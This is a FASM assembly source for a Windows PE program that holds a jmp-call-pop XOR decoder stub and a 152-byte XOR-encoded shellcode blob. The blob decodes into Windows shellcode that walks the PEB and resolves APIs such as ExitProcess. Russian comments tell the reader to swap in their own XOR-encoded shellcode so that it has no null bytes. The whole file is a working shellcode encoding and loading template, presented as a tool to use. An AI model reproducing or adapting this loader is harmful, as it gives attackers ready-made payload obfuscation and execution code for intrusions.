; vim: set filetype=fasm :

format PE console
entry start

section '.text' code readable writable executable

start:
    jmp short call_decoder

decoder:
    pop esi                 ; ESI = адрес закодированного шеллкода
    xor ecx, ecx            ; ECX = 0
    mov cl, 152   ; Длина шеллкода
decode_loop:
    xor byte [esi], 0xAA    ; Декодирование XOR с ключом 0xAA
    inc esi                 ; Следующий байт
    loop decode_loop        ; Повторить для всех байтов
    jmp decoded_shellcode   ; Перейти к декодированному шеллкоду

call_decoder:
    call decoder            ; Вызов декодера (помещает адрес в стек)
    
decoded_shellcode:
    ; Закодированный шеллкод (без 0-байтов, т.е. предварительно проксорить все байты с `0xAA`) 
    ; поместить вот вместо этого шеллкода (после декодирования станет рабочим)
    db 0xCE,0x0B,0x9A,0xAA,0xAA,0xAA,0x21,0xEA,0xA6,0x21,0xEA,0xBE,0x21,0xAA,0x21,0xAA
    db 0x21,0xF2,0xBA,0x21,0xE9,0x96,0xAB,0x72,0x21,0xEA,0xD2,0xAB,0x72,0x23,0x68,0x21
    db 0xE2,0xB2,0x21,0xEA,0x8A,0xAB,0x72,0x23,0x6C,0x21,0xE8,0xB6,0xAB,0x72,0x23,0x6D
    db 0x21,0xE8,0x8E,0xAB,0x72,0x23,0x6F,0x9B,0x78,0x21,0xAC,0xAB,0x72,0xFC,0xFD,0xFB
    db 0xF8,0x23,0x6C,0x23,0x4D,0x29,0x45,0xEA,0x6D,0xAD,0xEF,0xD2,0xC3,0xDE,0x6D,0xED
    db 0xAE,0xFA,0xD8,0xC5,0xC9,0x6D,0xED,0xA2,0xCF,0xD9,0xD9,0xAA,0x6C,0xED,0xA1,0xAA
    db 0x20,0xAC,0x20,0xA5,0x92,0x62,0xDF,0xA6,0x2E,0x6A,0xDE,0xAE,0xEC,0xED,0x41,0x5A
    db 0x9B,0x6A,0x41,0xAF,0x12,0xAB,0xAA,0xAA,0xAA,0xF0,0xF3,0xF5,0xF4,0x2F,0x6A,0xDE
    db 0xAC,0x29,0x6C,0xAE,0xE8,0x48,0x18,0xA5,0x1D,0xEE,0xFF,0xAA,0x6B,0x4A,0xA8,0xAB
    db 0x52,0x21,0xAA,0xAB,0x72,0xFA,0x55,0x7A
